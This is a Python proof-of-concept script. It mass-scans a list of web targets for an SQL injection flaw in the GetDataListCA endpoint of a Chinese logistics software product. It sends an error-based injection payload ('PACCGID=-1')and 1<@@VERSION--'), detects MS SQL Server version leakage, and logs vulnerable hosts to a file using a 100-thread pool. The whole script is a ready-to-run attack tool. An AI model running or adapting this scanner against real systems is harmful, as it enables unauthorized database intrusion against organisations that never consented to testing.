import argparse,requests,re,sys
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def a():
    text="""
███████╗ ██████╗ ██╗     ██╗
██╔════╝██╔═══██╗██║     ██║
███████╗██║   ██║██║     ██║
╚════██║██║▄▄ ██║██║     ██║
███████║╚██████╔╝███████╗██║
╚══════╝ ╚══▀▀═╝ ╚══════╝╚═╝                                                   
"""
    print(text)

def poc(target):
    payloade="/MvcShipping/MsCwGenlegAccitems/GetDataListCA"
    data1="PACCGID=-1')and 1<@@VERSION--"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
    }
    try:
        res=requests.get(url=target,timeout=5,verify=False)
        if res.status_code==200:
            res1=requests.post(url=target+payloade,verify=False,data=data1,headers=headers)
            if re.search('(Microsoft SQL Server 2008 R2)',res1.text).group(0)=="Microsoft SQL Server 2008 R2":
                print(f"[+]{target}存在SQL注⼊漏洞")
                with open("result.txt",'a',encoding="utf-8")as f:
                    f.write(target+'\n')
            else:
                print(f"[-]{target}不存在该漏洞")
        else:
            print(f"[*]{target}访问出现问题，请手工注入")
    except:
        pass

def main():
    a()
    parse=argparse.ArgumentParser(description="东胜物流软件GetDataListCA接口存在SQL注⼊漏洞")
    parse.add_argument('-u','--url',type=str,help="please input your link",dest="url")
    parse.add_argument('-f','--file',type=str,help="please input your file",dest="file")
    args=parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        urllist=[]
        with open(args.file,'r',encoding='utf-8')as fp:
            for i in fp.readlines():
                urllist.append(i.strip())
        mp=Pool(100)
        mp.map(poc,urllist)
        mp.close
        mp.join
    else:
        print(f"Usage : Python {sys.argv[0]} -h") 

if __name__=="__main__":
    main()